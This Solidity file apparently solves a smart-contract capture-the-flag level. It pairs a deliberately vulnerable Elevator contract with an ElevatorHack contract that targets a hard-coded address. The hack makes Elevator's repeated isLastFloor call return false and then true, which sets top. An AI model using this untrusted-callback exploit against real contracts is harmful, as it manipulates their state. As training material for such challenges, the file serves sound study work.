// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorHack {
    bool public top = false;
    Elevator constant elevator =
        Elevator(0x5D06FA99f23B59cA46E66988682561769AD89Ded);

    constructor() {}

    function isLastFloor(uint256 floor) external returns (bool) {
        bool test = top;
        top = !top;
        return test;
    }

    function do_hack() external {
        elevator.goTo(10);
    }
}